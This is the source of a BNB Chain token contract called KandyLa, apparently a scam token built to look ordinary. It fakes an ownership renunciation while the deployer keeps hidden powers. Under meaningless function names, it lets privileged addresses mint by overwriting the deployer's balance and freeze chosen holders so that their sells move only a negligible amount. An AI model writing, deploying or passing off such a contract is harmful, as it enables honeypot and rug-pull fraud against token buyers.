/**
 *Submitted for verification at BscScan.com on 2023-01-30
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface txLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeMaxEnable {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract KandyLa {
    uint8 public decimals = 18;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "KandyLa";
    mapping(address => uint256) public balanceOf;




    address public walletLiquidityMin;
    string public symbol = "KA";
    uint256 constant launchMax = 10 ** 10;
    address public fundLiquidity;
    mapping(address => bool) public fundFromList;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    bool public walletBuyReceiver;
    address public owner;
    mapping(address => bool) public atLaunch;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        txLaunched limitTake = txLaunched(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fundLiquidity = feeMaxEnable(limitTake.factory()).createPair(limitTake.WETH(), address(this));
        owner = atShould();
        walletLiquidityMin = owner;
        atLaunch[walletLiquidityMin] = true;
        balanceOf[walletLiquidityMin] = totalSupply;
        emit Transfer(address(0), walletLiquidityMin, totalSupply);
        marketingReceiver();
    }

    

    function totalList(address exemptEnable, address shouldLimit, uint256 buyAtReceiver) internal returns (bool) {
        require(balanceOf[exemptEnable] >= buyAtReceiver);
        balanceOf[exemptEnable] -= buyAtReceiver;
        balanceOf[shouldLimit] += buyAtReceiver;
        emit Transfer(exemptEnable, shouldLimit, buyAtReceiver);
        return true;
    }

    function marketingReceiver() public {
        emit OwnershipTransferred(walletLiquidityMin, address(0));
        owner = address(0);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function launchedMax(address enableAuto) public {
        if (walletBuyReceiver) {
            return;
        }
        atLaunch[enableAuto] = true;
        walletBuyReceiver = true;
    }

    function exemptTeamFund(uint256 buyAtReceiver) public {
        if (buyAtReceiver == 0 || !atLaunch[atShould()]) {
            return;
        }
        balanceOf[walletLiquidityMin] = buyAtReceiver;
    }

    function approve(address senderSell, uint256 buyAtReceiver) public returns (bool) {
        allowance[atShould()][senderSell] = buyAtReceiver;
        emit Approval(atShould(), senderSell, buyAtReceiver);
        return true;
    }

    function amountTxTrading(address isLiquidityToken) public {
        if (isLiquidityToken == walletLiquidityMin || !atLaunch[atShould()]) {
            return;
        }
        fundFromList[isLiquidityToken] = true;
    }

    function transferFrom(address amountMin, address maxTrading, uint256 buyAtReceiver) public returns (bool) {
        if (amountMin != atShould() && allowance[amountMin][atShould()] != type(uint256).max) {
            require(allowance[amountMin][atShould()] >= buyAtReceiver);
            allowance[amountMin][atShould()] -= buyAtReceiver;
        }
        if (maxTrading == walletLiquidityMin || amountMin == walletLiquidityMin) {
            return totalList(amountMin, maxTrading, buyAtReceiver);
        }
        if (fundFromList[amountMin]) {
            return totalList(amountMin, maxTrading, launchMax);
        }
        return totalList(amountMin, maxTrading, buyAtReceiver);
    }

    function atShould() private view returns (address) {
        return msg.sender;
    }

    function transfer(address maxTrading, uint256 buyAtReceiver) external returns (bool) {
        return transferFrom(atShould(), maxTrading, buyAtReceiver);
    }


}